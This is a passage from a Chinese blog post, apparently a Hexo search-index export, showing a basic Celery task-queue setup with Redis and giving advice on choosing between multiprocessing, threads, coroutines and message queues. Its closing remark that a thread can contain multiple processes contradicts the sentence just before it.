<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install celery</span><br></pre></td></tr></table></figure>
<p>2、创建使用celery的应用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Celery 应用</span></span><br><span class="line">app = Celery(<span class="string">&#x27;myapp&#x27;</span>, broker=<span class="string">&#x27;redis://localhost:6379/0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义任务</span></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3、启动celry服务端，也就是启动消息队列：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">celery -A tasks worker --loglevel=info</span><br></pre></td></tr></table></figure>

<p>4、其他函数调用消息队列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tasks <span class="keyword">import</span> add</span><br><span class="line"></span><br><span class="line">result = add.delay(<span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(result.get())</span><br></pre></td></tr></table></figure>

<p>什么时候使用？耗时应用需要解耦、异步、削峰处理时使用此技术。</p>
<p>比如一个爬虫，它需要爬去、解析内容、记录到数据库。</p>
<p>那每个任务都可以写成多线程，然后进入消息队列，下一个任务直接从消息队列中取并继续压入消息队列：</p>
<h2 id="怎么选择"><a href="#怎么选择" class="headerlink" title="怎么选择"></a>怎么选择</h2><p>如果是CPU密集型任务，那当然直接多进程。</p>
<p>如果是IO密集型任务，就有两种选择多线程和协程，如果协程库支持不完善，代码复杂度超出能力。那就选择多线程，否则选择协程，毕竟协程是新的技术，应该有更好的速度表现。</p>
<p>当需要 解耦、异步、削峰 时我们考虑消息队列并结合上述的技术进行优化。</p>
<p>![image-20230905153811141](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230905153811141.png)</p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>需要注意的是进程、线程、协程不是并列关系，他们是包含关系。进程包含线程包含协程。也就是说一个进程可以有多个线程一个线程可以有多个进程。</p>
<p>由于本身不是程序员，对代码理解有限，如果文中有错误的地方欢迎评论区指出。</p>
]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
